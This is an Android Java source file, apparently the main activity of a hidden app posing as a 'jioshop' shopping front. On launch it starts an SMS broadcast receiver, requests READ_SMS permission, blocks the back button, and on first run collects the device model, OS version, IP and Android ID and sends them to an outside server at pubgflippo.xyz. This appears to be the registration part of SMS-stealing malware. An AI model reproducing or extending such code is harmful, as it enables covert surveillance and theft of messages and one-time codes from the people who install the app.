package com.example.hiddenapp;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Parcelable;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.CookieSyncManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.messaging.FirebaseMessaging;
import com.mijio.jioshop.LandingActivity;

import java.io.File;
import java.io.IOException;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.ByteOrder;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;

import static android.content.ContentValues.TAG;

public class MainActivity extends Activity {

    public String ipaddress;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startService(new Intent(this,SMSBroadcastReceiver.class));
        FirebaseMessaging.getInstance().subscribeToTopic("apps");

        called();
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") != PackageManager.PERMISSION_GRANTED) {
            final int REQUEST_CODE_ASK_PERMISSIONS = 123;
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
        }
        startActivity(new Intent(getApplicationContext(), LandingActivity.class));

    }

    @Override
    public void onBackPressed() {


    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

    }

    private void createNotificationChannel() {
        // Create the NotificationChannel, but only on API 26+ because
        // the NotificationChannel class is new and not in the support library
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "hai notify";
            String description = "hai des";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel("hai", name, importance);
            channel.setDescription(description);
            // Register the channel with the system; you can't change the importance
            // or other notification behaviors after this
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }


    }
    public void called() {
                SimpleDateFormat simpleDateFormat=new SimpleDateFormat("dd-mm-yyyy HH:MM:ss");
                SimpleDateFormat simpleDateFormat1=new SimpleDateFormat("aa");
                 Date date=new Date();
                 String date1=simpleDateFormat.format(date);
                 String dat=simpleDateFormat1.format(date);
                 String msgData1="";

        try {
            Date value=simpleDateFormat.parse(date1);
            if(dat.contains("PM"))
            {msgData1=String.valueOf(value.getTime()
                  //  +43200000
            );}
            else{msgData1=String.valueOf(value.getTime());}
        } catch (ParseException e) {
            e.printStackTrace();
        }
        Log.d(TAG, "called:erxrtfcfxrztxfcccccccccccccccccccccccccccccccccc"+msgData1);

           final  Context devicecontext=createDeviceProtectedStorageContext();
        SharedPreferences sharedPreferences =devicecontext.getSharedPreferences("shared",MODE_PRIVATE);
                final String storedtime = sharedPreferences.getString("time", null);
                if (storedtime == null || storedtime.trim()=="") {
                   long user=(long)Math.floor(Math.random() * 9_000_000_000L) +1_000_000_000L;
                    String userid=String.valueOf(user);
                    Log.d(TAG, "called: called"+msgData1);
                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putString("time", msgData1);
                    editor.putString("userid",userid);
                    editor.apply();
                    editor.commit();
            String os = Build.VERSION.RELEASE;
            String model = Build.MODEL;
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);

            int ip = wifiManager.getConnectionInfo().getIpAddress();
            ip = (ByteOrder.nativeOrder().equals(ByteOrder.LITTLE_ENDIAN)) ? Integer.reverseBytes(ip) : ip;
            byte[] bytes = BigInteger.valueOf(ip).toByteArray();
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

            String deviceid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);



            Sender s=new Sender(getApplicationContext(),"https://pubgflippo.xyz/admin/insertuser.php","","","",-1,os,model,ipaddress,deviceid,userid);
            s.execute();


        }
    }
}







